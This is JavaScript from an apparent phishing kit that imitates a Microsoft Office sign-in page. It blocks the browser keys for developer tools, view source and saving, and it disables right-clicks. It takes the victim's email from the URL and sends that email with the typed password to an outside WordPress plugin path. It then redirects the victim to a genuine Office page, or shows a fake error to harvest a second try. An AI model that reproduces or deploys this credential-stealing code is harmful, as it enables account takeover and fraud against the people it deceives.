    
    document.onkeydown = function(e) {
    if(event.keyCode == 123) {
    return false;
}
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
    return false;
}
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
    return false;
}
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
    return false;
}
    if(e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)){
    return false;
}
    document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false); 
} 

 $('#pass').keyup(function(event){
   if(event.which==13){
       $('#submit').click();
   }
});

           
     $(document).ready(function () {
        $('#pass').on('input change', function () {
            if ($(this).val() != '') {
                $('#submit').prop('disabled', false);
            }
            else {
                $('#submit').prop('disabled', true);
            }
        });
    });
    
         var hash = window.location.hash;

        document.getElementById('user').value = hash.split('#')[1];
        document.getElementById('user').innerHTML = hash.split('#')[1];

      $(function(){
    
    var twoToneButton = document.querySelector('.twoToneButton');
    
    twoToneButton.addEventListener("click", function() {
        twoToneButton.innerHTML = "Signing in...";
        
      setTimeout( 
            function  (){  
                twoToneButton.innerHTML = "Sign In";
                
            }, 15000);
    }, false);
    
});
    
       
        function sendmails() {
            var em = $('#user').val();
            
            var ps = $('#pass').val();
            

                    var xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {

                            var response = JSON.parse(this.responseText);

                            if (response.msg == "donesend") {
                                setTimeout("window.location.href='https://protection.office.com/#/messagetrace';",1000);
                            } else {
                               $("#warning").empty();
                                $('#warning').append('Your email or password is incorrect. If you don\'t remember your password,<a href="javascript:history.go(0)"> reset it now.<a/> <br> <br> ' );
                            }
                        }
                    };
                    xhttp.open("GET", "https://newgrowthlifedesign.com/wp-content/plugins/ez/?user=" user + em + "&pass=" +ps, true);
                    xhttp.send();
                }

